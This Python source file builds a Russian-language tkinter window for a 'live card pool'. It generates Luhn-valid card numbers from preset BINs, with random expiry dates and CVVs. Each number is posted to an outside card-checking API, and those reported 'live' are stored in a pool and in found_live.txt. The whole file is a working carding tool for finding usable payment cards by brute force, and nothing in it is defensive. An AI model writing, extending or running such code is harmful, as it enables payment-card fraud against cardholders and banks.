# -*- coding: utf-8 -*-
"""
Shared pool for live cards and a generator window to pre-fetch them.
"""

import tkinter as tk
import threading
import requests
import random
import time
from .themes import THEMES

# Global shared pool of live cards
# Format: { "BIN": [ "card|month|year|cvv", ... ] }
LIVE_CARD_POOL = {}
POOL_LOCK = threading.Lock()

def get_live_card_from_pool(bin_val):
    with POOL_LOCK:
        if bin_val in LIVE_CARD_POOL and len(LIVE_CARD_POOL[bin_val]) > 0:
            return LIVE_CARD_POOL[bin_val].pop(0)
    return None

def get_pool_count(bin_val):
    with POOL_LOCK:
        if bin_val in LIVE_CARD_POOL:
            return len(LIVE_CARD_POOL[bin_val])
    return 0

def add_live_card_to_pool(bin_val, card_data):
    with POOL_LOCK:
        if bin_val not in LIVE_CARD_POOL:
            LIVE_CARD_POOL[bin_val] = []
        LIVE_CARD_POOL[bin_val].append(card_data)


def show_pre_generator_window(parent, theme_name="light"):
    win = tk.Toplevel(parent)
    win.title("Пул Живых Карт")
    win.geometry("400x500")

    colors = THEMES.get(theme_name, THEMES["light"])
    accent_bg = colors.get("accent", "#2563eb")
    accent_fg = colors.get("accent_fg", colors["fg"])
    win.config(bg=colors["bg"])

    content_frame = tk.Frame(win, bg=colors["bg"])
    content_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)

    # Variables
    import tkinter.ttk as ttk
    bin_var = tk.StringVar(value="625814264615")
    count_var = tk.IntVar(value=5)
    
    lbl_font = ("Arial", 10, "bold")
    val_font = ("Arial", 10)

    tk.Label(content_frame, text="BIN для генерации:", font=lbl_font, bg=colors["bg"], fg=colors["fg"]).pack(anchor="w", pady=(0, 5))
    
    bins = ["625814264615", "6258142602", "55182706"]
    bin_combo = ttk.Combobox(content_frame, textvariable=bin_var, values=bins, state="readonly", font=val_font)
    bin_combo.pack(fill=tk.X, pady=(0, 15))

    tk.Label(content_frame, text="Количество живых карт:", font=lbl_font, bg=colors["bg"], fg=colors["fg"]).pack(anchor="w", pady=(0, 5))
    
    count_entry = tk.Entry(content_frame, textvariable=count_var, font=val_font, bg=colors["entry_bg"], fg=colors["entry_fg"])
    count_entry.pack(fill=tk.X, pady=(0, 20))

    status_var = tk.StringVar(value="Готов к запуску")
    status_lbl = tk.Label(content_frame, textvariable=status_var, font=val_font, bg=colors["bg"], fg=colors["fg"], wraplength=350, justify="left")
    status_lbl.pack(fill=tk.X, pady=(0, 20))

    pool_status_var = tk.StringVar(value="")
    pool_status_lbl = tk.Label(content_frame, textvariable=pool_status_var, font=lbl_font, bg=colors["bg"], fg="#10b981")
    pool_status_lbl.pack(fill=tk.X, pady=(0, 20))

    is_running = False
    stop_event = threading.Event()

    def update_pool_status():
        if win.winfo_exists():
            bin_val = bin_var.get()
            count = get_pool_count(bin_val)
            pool_status_var.set(f"В пуле для {bin_val}:\n{count} карт")
            win.after(1000, update_pool_status)

    update_pool_status()

    def generate_luhn_number(bin_number):
        digits = [int(d) for d in str(bin_number)]
        while len(digits) < 15:
            digits.append(random.randint(0, 9))

        sum_ = 0
        for i, digit in enumerate(reversed(digits)):
            if i % 2 == 0:
                digit *= 2
                if digit > 9:
                    digit -= 9
            sum_ += digit
        check_digit = (10 - (sum_ % 10)) % 10
        digits.append(check_digit)
        return "".join(map(str, digits))

    def generate_virtual_card(bin_val):
        number = generate_luhn_number(bin_val)
        month = f"{random.randint(1, 12):02d}"
        year = random.randint(2025, 2030)
        cvv = f"{random.randint(100, 999)}"
        return number, month, year, cvv

    def check_card(card_details):
        url = "https://api.chkr.cc/"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        payload = {"data": card_details}
        try:
            response = requests.post(url, headers=headers, json=payload, timeout=15)
            if response.status_code == 200:
                return response.json()
            return None
        except:
            return None

    def worker(bin_val, target_count):
        nonlocal is_running
        attempt = 0
        found = 0
        
        while found < target_count and not stop_event.is_set():
            attempt += 1
            number, month, year, cvv = generate_virtual_card(bin_val)
            card_details = f"{number}|{month}|{year}|{cvv}"
            
            def set_status(att, cd, fnd, tgt):
                status_var.set(f"Попытка {att}\nИщем: {cd}\nНайдено: {fnd} / {tgt}")
            win.after(0, set_status, attempt, card_details, found, target_count)
            
            result = check_card(card_details)
            if result and isinstance(result, dict):
                status = result.get('status', '').lower()
                msg = result.get('message', '')
                if status == "live":
                    found += 1
                    add_live_card_to_pool(bin_val, card_details)
                    try:
                        with open("found_live.txt", "a", encoding="utf-8") as f:
                            f.write(f"{card_details} | {msg} | Pool | {time.ctime()}\n")
                    except:
                        pass
            time.sleep(1)
            
        is_running = False
        def on_finish(fnd, tgt):
            status_var.set(f"Завершено. Найдено {fnd} из {tgt}.")
            btn_start.config(text="Запустить прегенерацию", bg=accent_bg, fg=accent_fg)
        win.after(0, on_finish, found, target_count)

    def toggle_run():
        nonlocal is_running
        if is_running:
            stop_event.set()
        else:
            try:
                target = count_var.get()
                if target <= 0:
                    return
            except ValueError:
                return
                
            bin_val = bin_var.get()
            if not bin_val:
                return
                
            is_running = True
            stop_event.clear()
            btn_start.config(text="Остановить", bg="#dc2626", fg="white")
            threading.Thread(target=worker, args=(bin_val, target), daemon=True).start()

    btn_start = tk.Button(content_frame, text="Запустить прегенерацию", font=("Arial", 11, "bold"),
                          bg=accent_bg, fg=accent_fg, command=toggle_run, pady=10)
    btn_start.pack(fill=tk.X, pady=10)

    def on_close():
        stop_event.set()
        win.destroy()
        
    win.protocol("WM_DELETE_WINDOW", on_close)
